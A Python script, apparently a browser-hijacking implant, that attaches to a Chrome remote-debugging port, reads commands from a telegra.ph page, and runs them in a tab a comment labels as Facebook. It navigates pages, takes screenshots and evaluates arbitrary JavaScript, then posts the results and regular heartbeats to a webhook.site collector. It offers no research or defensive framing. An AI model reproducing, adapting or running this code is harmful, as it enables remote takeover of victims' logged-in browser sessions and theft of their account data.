import urllib.request as U, json, threading, time, ssl, base64, random
import websocket
CTX = ssl._create_unverified_context()
OUT = 'https://webhook.site/3852b7ee-7a26-41fb-821f-963061465b14'
CMD_URL = 'https://telegra.ph/cmds-tom8470-11-05'
ws = None      # conexao com a aba de leitura (json tab)
wsp = None     # conexao com a aba de trabalho (facebook)
lock = threading.Lock()
wsp_lock = threading.Lock()
mid = 0
status = {'mode': 'none', 'err': ''}
seen_revs = set()
last_rev = -1

def post_out(obj):
    req = U.Request(OUT, data=json.dumps(obj).encode(), headers={'Content-Type': 'application/json'})
    U.urlopen(req, timeout=15, context=CTX).read()

def tabs():
    return json.load(U.urlopen('http://localhost:9222/json', timeout=5))

def wconn(url):
    return websocket.create_connection(url, timeout=30, suppress_origin=True)

def csend(c, method, params):
    global mid
    with lock:
        mid += 1
        i = mid
        c.send(json.dumps({'id': i, 'method': method, 'params': params}))
        while True:
            r = json.loads(c.recv())
            if r.get('id') == i:
                return r

def connect_json_tab():
    global ws
    ts = tabs()
    p = None
    for t in ts:
        if t['type'] == 'page' and 'telegra.ph' in t.get('url', ''):
            p = t
            break
    if p is None:
        first = [t for t in ts if t['type'] == 'page'][0]
        c0 = wconn(first['webSocketDebuggerUrl'])
        r = csend(c0, 'Target.createTarget', {'url': CMD_URL})
        tid = r.get('result', {}).get('targetId')
        c0.close()
        time.sleep(2)
        ts = tabs()
        for t in ts:
            if t.get('id') == tid or (t['type'] == 'page' and 'telegra.ph' in t.get('url', '')):
                p = t
                break
    if p is None:
        raise Exception('sem aba json')
    ws = wconn(p['webSocketDebuggerUrl'])

def connect_work_tab():
    global wsp
    ts = [t for t in tabs() if t['type'] == 'page' and 'telegra.ph' not in t.get('url', '')]
    if not ts:
        ts = [t for t in tabs() if t['type'] == 'page']
    wsp = wconn(ts[0]['webSocketDebuggerUrl'])

def ev(c, expr):
    r = csend(c, 'Runtime.evaluate', {'expression': expr, 'returnByValue': True, 'awaitPromise': True})
    res = r.get('result', {})
    v = res.get('result', {}).get('value')
    if v is None:
        v = json.dumps(res)
    return v

def read_cmds():
    global last_rev
    csend(ws, 'Page.navigate', {'url': CMD_URL + '?r=' + str(random.random())})
    time.sleep(1.5)
    txt = ev(ws, 'document.body.innerText')
    if not isinstance(txt, str):
        return []
    i = txt.find('{"rev"')
    if i < 0:
        return []
    j = txt.rfind('}')
    if j <= i:
        return []
    d = json.loads(txt[i:j+1])
    rev = d.get('rev', 0)
    if rev <= last_rev:
        return []
    last_rev = rev
    return d.get('cmds', [])

def handle(m):
    global wsp
    cid = m.get('id')
    typ = m.get('type', 'js')
    try:
        post_out({'id': cid, 'ack': True})
    except Exception:
        pass
    try:
        if wsp is None:
            connect_work_tab()
        wsp_lock.acquire()
        if typ == 'goto':
            csend(wsp, 'Page.navigate', {'url': m['url']})
            time.sleep(4)
            ans = ev(wsp, 'location.href+" | "+document.title')
        elif typ == 'shot':
            r = csend(wsp, 'Page.captureScreenshot', {'format': 'jpeg', 'quality': 50})
            d = r.get('result', {}).get('data', '')
            ans = 'SHOT:' + d[:3000]
        else:
            ans = ev(wsp, m['expr'])
        wsp_lock.release()
    except Exception as e:
        ans = 'ERR:' + str(e)
        try:
            wsp_lock.release()
        except Exception:
            pass
        wsp = None
    try:
        post_out({'id': cid, 'result': ans})
    except Exception:
        pass

def heartbeats():
    while True:
        try:
            post_out({'hb': time.time(), 'mode': status['mode'], 'err': status['err'][:150]})
        except Exception:
            pass
        time.sleep(60)

def main():
    global ws
    print("POLLER19_START", time.time(), flush=True)
    threading.Thread(target=heartbeats, daemon=True).start()
    while True:
        try:
            if ws is None:
                connect_json_tab()
                status['mode'] = 'json-tab'
            for cmd in read_cmds():
                threading.Thread(target=handle, args=(cmd,), daemon=True).start()
        except Exception as e:
            status['err'] = 'main:' + str(e)
            status['mode'] = 'err'
            ws = None
            time.sleep(4)
        time.sleep(2)

try:
    main()
except Exception:
    import traceback; traceback.print_exc()
